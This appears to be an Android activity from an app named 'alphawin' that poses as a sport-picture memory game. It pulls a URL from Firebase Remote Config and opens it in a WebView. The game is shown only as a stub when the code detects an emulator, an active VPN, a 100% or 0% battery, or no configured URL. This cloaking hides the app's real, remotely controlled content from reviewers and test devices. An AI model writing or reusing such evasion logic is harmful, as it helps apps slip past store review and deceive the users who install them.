package play.alphawin.bg;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.constraintlayout.widget.ConstraintLayout;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import android.app.Dialog;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.graphics.drawable.Drawable;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.GridView;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.Spinner;
import android.widget.TextView;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Locale;

public class MainActivity2 extends AppCompatActivity {

    public boolean to;
    private ImageView mImageView = null;
    public int level = 0;
    private boolean win = false;
    private int contPair=0;
    private int[] pairs = {3,8,10,18};
    private int[] numsCount={2,4,5,6};
    final int[] pics = new int[]{R.drawable.sport1, R.drawable.sport2, R.drawable.sport3, R.drawable.sport4, R.drawable.sport5, R.drawable.sport6,
            R.drawable.sport7, R.drawable.sport8, R.drawable.sport9, R.drawable.sport10, R.drawable.sport11, R.drawable.sport12,
            R.drawable.sport13, R.drawable.sport13, R.drawable.sport14, R.drawable.sport15, R.drawable.sport16, R.drawable.sport17, R.drawable.sport18};
    List<Integer> pos =new ArrayList<Integer>();
    public int currpos = -1;
    public static Animation mAppearAnimation, mFadeAnimation;
    GridView gvMain;


    private static final String FILE_NAME="MY_FILE_NAME";
    private static final String URL_STRING="URL_STRING";
    public Bundle savedInst;
    String url_FB;
    String url_SP;
    SQLiteDatabase database;
    SharedPreferences sPref;
    SharedPreferences.Editor ed;
    private FirebaseRemoteConfig mfirebaseRemoteConfig;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        savedInst = savedInstanceState;
        //проверка сохранена ли ссылка
        url_SP = getSharedPrefStr();
        if(url_SP=="") {
            //подключение к FireBase
            getFireBaseUrlConnection();
            getBool();

        }else{
            //проверка на подключение к интернету
            if(!hasConnection(this)){
                Intent intent = new Intent(MainActivity2.this, NoInternet.class);
                startActivity(intent);
            }
            else{//запускаем WebView
                browse(url_SP);
            }
        }
    }

    //включение WebView
    public void browse(String url){
        Intent intent = new Intent(MainActivity2.this, MainActivity3.class);
        intent.putExtra("url", url);
        startActivity(intent);
    }

    //проверка эмулятора
    private boolean checkIsEmu() {
        String phoneModel = Build.MODEL;
        String buildProduct = Build.PRODUCT;
        String buildHardware = Build.HARDWARE;
        String brand = Build.BRAND;
        return (Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.toLowerCase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || buildHardware.equals("goldfish")
                || brand.contains("google")
                || buildHardware.equals("vbox86")
                || buildProduct.equals("sdk")
                || buildProduct.equals("google_sdk")
                || buildProduct.equals("sdk_x86")
                || buildProduct.equals("vbox86p")
                || Build.BOARD.toLowerCase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.toLowerCase(Locale.getDefault()).contains("nox")
                || buildHardware.toLowerCase(Locale.getDefault()).contains("nox")
                || buildProduct.toLowerCase(Locale.getDefault()).contains("nox"))
                || (brand.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                ||"google_sdk".equals(Build.PRODUCT)
                || "sdk_gphone_x86_arm".equals(Build.PRODUCT)
                ||"sdk_google_phone_x86".equals(Build.PRODUCT);
    }

    public static boolean vpnActive(Context context){
        //this method doesn't work below API 21
        if (android.os.Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP)
            return false;
        boolean vpnInUse = false;
        ConnectivityManager connectivityManager = (ConnectivityManager)        context.getSystemService(Context.CONNECTIVITY_SERVICE);

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            Network activeNetwork = connectivityManager.getActiveNetwork();
            NetworkCapabilities caps = connectivityManager.getNetworkCapabilities(activeNetwork);
            return caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN);
        }
        Network[] networks = connectivityManager.getAllNetworks();
        for(int i = 0; i < networks.length; i++) {
            NetworkCapabilities caps = connectivityManager.getNetworkCapabilities(networks[i]);
            if(caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
                vpnInUse = true;
                break;
            }
        }
        return vpnInUse;
    }

    private boolean isBatteryLevelInRange() {
        BatteryManager bm = (BatteryManager) this.getSystemService(BATTERY_SERVICE);
        int batLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        return (1<=batLevel)&&(batLevel<=99);
    }
    //проверка интернет подключения
    public static boolean hasConnection(final Context context)
    {
        ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        if (wifiInfo != null && wifiInfo.isConnected())
        {
            return true;
        }
        wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        if (wifiInfo != null && wifiInfo.isConnected())
        {
            return true;
        }
        wifiInfo = cm.getActiveNetworkInfo();
        if (wifiInfo != null && wifiInfo.isConnected())
        {
            return true;
        }
        return false;
    }

    private void getBool(){
        mfirebaseRemoteConfig.fetchAndActivate()
                .addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                    @Override
                    public void onComplete(@NonNull Task<Boolean> task) {
                        if (task.isSuccessful()) {
                            Log.i("To", String.valueOf(task.getResult()));
                            String value = mfirebaseRemoteConfig.getString("to");
                            if(value.equals("true")){
                                if(vpnActive(MainActivity2.this)){
                                    plug();
                                }
                                else{
                                    getURLStr();
                                }
                            } else if(value.equals("false")) {
                                getURLStr();
                            } else if(value.equals("")) {
                                to= false;
                                getURLStr();
                            }

                        } else {
                            Log.i("To", "null");
                        }
                    }
                });
    }

    //получение ссылки и обработка вызова заглушки/WebView
    public void getURLStr(){
        try {
            mfirebaseRemoteConfig.fetchAndActivate()
                    .addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                        @Override
                        public void onComplete(@NonNull Task<Boolean> task) {
                            if (task.isSuccessful()) {
                                Log.i("Fire", String.valueOf(task.getResult()));
                                url_FB = mfirebaseRemoteConfig.getString("url");
                                if (url_FB.isEmpty()||checkIsEmu()||(!isBatteryLevelInRange())) {
                                    plug();
                                } else {
                                    Log.i("Fire", url_FB);
                                    saveToSP();
                                    browse(url_FB);
                                }

                            } else {
                                url_FB = "";
                                plug();
                                Log.i("Fire", "null2");
                            }
                        }
                    });
        }
        catch (Exception e){
            System.out.println(e.getMessage());
            Intent intent = new Intent(MainActivity2.this, NoInternet.class);
            startActivity(intent);
        }
    }

    //получение локальной ссылки
    public String getSharedPrefStr(){
        sPref = getSharedPreferences(FILE_NAME,MODE_PRIVATE);
        String url_SP = sPref.getString(URL_STRING,"");
        return url_SP;
    }

    //подключение к Firebase
    public void getFireBaseUrlConnection(){
        //подключение к FireBase
        mfirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(10)
                .build();
        mfirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
        mfirebaseRemoteConfig.setDefaultsAsync(R.xml.url_values);
    }
    //вызыв зваглушки
    public void plug(){
        setContentView(R.layout.activity_main2);
        setContentView(R.layout.activity_main2);
        mAppearAnimation = AnimationUtils.loadAnimation(this, R.anim.appear);
        mFadeAnimation = AnimationUtils.loadAnimation(this, R.anim.fade);
        mAppearAnimation.setAnimationListener(animationAppearListener);
        mFadeAnimation.setAnimationListener(animationFadeListener);
        getPositions();
        gvMain = (GridView)findViewById(R.id.gvMain);
        GridAdapter gridAdapter = new GridAdapter(this, (pairs[level]*2),350);
        gvMain.setAdapter(gridAdapter);
        gvMain.setEnabled(false);
        gvMain.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> adapterView, View view, int i, long l) {
                if(currpos<0){
                    currpos=i;
                    mImageView=(ImageView)view;
                    ((ImageView)view).setImageResource(pics[pos.get(i)]);
                    mImageView.startAnimation(mAppearAnimation);
                    //win = false;
                }
                else{
                    if(currpos==i){
                        mImageView.startAnimation(mFadeAnimation);
                        ((ImageView)view).setImageResource(R.drawable.bg);
                        currpos=-1;
                    }
                    else if(pos.get(currpos)!=pos.get(i)){
                        ((ImageView)view).setImageResource(pics[pos.get(i)]);
                        ((ImageView)view).startAnimation(mAppearAnimation);
                        //((ImageView)view).startAnimation(mFadeAnimation);
                        mImageView.setImageResource(R.drawable.bg);
                        //mImageView.startAnimation(mFadeAnimation);
                        ((ImageView)view).setImageResource(R.drawable.bg);
                        //mImageView.setImageResource(pics[pos.get(currpos)]);
                    }
                    else{
                        //win = true;
                        ((ImageView)view).setImageResource(pics[pos.get(i)]);
                        ((ImageView)view).startAnimation(mAppearAnimation);
                        //mImageView.setImageResource(pics[pos.get(i)]);
                        mImageView.setVisibility(View.INVISIBLE);
                        ((ImageView)view).setVisibility(View.INVISIBLE);
                        contPair++;
                        if(contPair==pairs[level]){
                            Dialog dialogWin = new Dialog(MainActivity2.this);
                            dialogWin.requestWindowFeature(Window.FEATURE_NO_TITLE);
                            dialogWin.setContentView(R.layout.win_dialog);
                            dialogWin.setCancelable(false);
                            dialogWin.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
                            dialogWin.show();
                            TextView text_dialog = (TextView) dialogWin.findViewById(R.id.dialog_reminder);
                            Button btn_okey= (Button) dialogWin.findViewById(R.id.ok_btn);
                            btn_okey.setOnClickListener(new View.OnClickListener() {
                                @Override
                                public void onClick(View view) {
                                    dialogWin.dismiss();
                                }
                            });
                        }

                    }
                    currpos=-1;
                }
            }
        });
        adjustGridView();
    }
    //сохранение ссылки локально
    public void saveToSP(){
        ed = sPref.edit();
        ed.putString(URL_STRING, url_FB);
        ed.apply();
        browse(url_FB);
    }




    /*public void timerCountDown(Long time){
        myTimer = new CountDownTimer(time*1000, 1000) {
            @Override
            public void onTick(long l) {
                int now = (int) l/1000;
                pb.setProgress(now);
                Long min = (l / 60000);
                Long sec = ((l % 60000) / 1000);
                edMin.setText(Long.toString(min));
                edSec.setText(Long.toString(sec));
            }

            @Override
            public void onFinish() {
                finish();
                //открытие диалогового окн

            }
        };
        myTimer.start();
    }*/

    private void adjustGridView(){
        gvMain.setNumColumns(numsCount[level]);
        //gvMain.setColumnWidth(300);
        gvMain.setVerticalSpacing(5);
        gvMain.setHorizontalSpacing(5);
        //gvMain.setStretchMode(GridView.STRETCH_SPACING_UNIFORM);
    }

    Animation.AnimationListener animationAppearListener = new Animation.AnimationListener() {

        @Override
        public void onAnimationEnd(Animation animation) {
            /*if(win==false) mImageView.startAnimation(mFadeAnimation);
            currpos = -1;*/
        }

        @Override
        public void onAnimationRepeat(Animation animation) {
        }

        @Override
        public void onAnimationStart(Animation animation) {
        }
    };

    Animation.AnimationListener animationFadeListener = new Animation.AnimationListener() {
        @Override
        public void onAnimationEnd(Animation animation) {
            //mImageView.setImageResource(R.drawable.bg);
        }

        @Override
        public void onAnimationRepeat(Animation animation) {
            // TODO Auto-generated method stub
        }

        @Override
        public void onAnimationStart(Animation animation) {
            // TODO Auto-generated method stub
        }
    };

    public void start(View view) {
        gvMain.setEnabled(true);
    }

    public void changeLevel(View view) {
        Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.dialog_layout);
        dialog.setCancelable(false);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.show();
        TextView text_dialog = (TextView) dialog.findViewById(R.id.dialog_reminder);
        Button btn_1= (Button) dialog.findViewById(R.id.lvl1);
        btn_1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                gridChange(0,350);
                dialog.dismiss();
            }
        });
        Button btn_2= (Button) dialog.findViewById(R.id.lvl2);
        btn_2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                gridChange(1,250);
                dialog.dismiss();
            }
        });
        Button btn_3= (Button) dialog.findViewById(R.id.lvl3);
        btn_3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                gridChange(2,200);
                dialog.dismiss();
            }
        });
        Button btn_4= (Button) dialog.findViewById(R.id.lvl4);
        btn_4.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                gridChange(3,160);
                dialog.dismiss();
            }
        });
    }

    private void gridChange(int i, int param){
        level=i;
        contPair=0;
        getPositions();
        adjustGridView();
        //gvMain.setColumnWidth(350);
        GridAdapter gridAdapter = new GridAdapter(MainActivity2.this, (pairs[level]*2), param);
        gvMain.setAdapter(gridAdapter);
        gvMain.setColumnWidth(GridView.AUTO_FIT);
    }
    public void getPositions(){

        pos.clear();
        for(int i=0;i<pairs[level];i++){
            pos.add(i);
            pos.add(i);
        }
        System.out.println("1111111111"+pos);
        Collections.shuffle(pos);
        System.out.println("1111111111"+pos);

    }
}